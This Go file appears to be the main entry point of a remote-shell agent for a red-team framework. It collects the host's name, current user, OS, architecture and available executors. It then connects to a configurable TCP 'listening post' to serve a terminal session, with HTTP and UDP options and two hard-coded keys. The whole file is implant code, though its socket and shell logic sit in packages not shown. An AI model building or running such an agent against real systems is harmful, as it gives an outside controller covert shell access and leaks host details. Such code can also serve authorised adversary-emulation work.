package main

import (
   "fmt"
   "os"
   "os/user"
   "runtime"
   "flag"

   "./util"
   "./output"
   "./sockets"
)

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   platform := runtime.GOOS
   architecture := runtime.GOARCH
   executors := util.DetermineExecutors(platform, architecture)
   shellInfo := fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)

   verbose := flag.Bool("v", false, "Enable verbose output")
   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
   udp := flag.String("udp", "127.0.0.1:5679", "The IP of the TCP listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
   contact := flag.String("contact", "tcp", "Which contact to use")

   flag.Parse()

   output.SetVerbose(*verbose)
   output.VerbosePrint(fmt.Sprintf("[*] TCP socket: %s", *tcp))
   output.VerbosePrint(fmt.Sprintf("[*] UDP socket: %s", *udp))

   if *contact == "tcp" {
      sockets.ListenTCP(terminal_key, *tcp, *http, shellInfo) 
   } else if *contact == "udp" {
      //sockets.ListenUDP(*udp)
   }
}

var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"
var terminal_key = "94699f9970213dd1d4054ca678f1278a"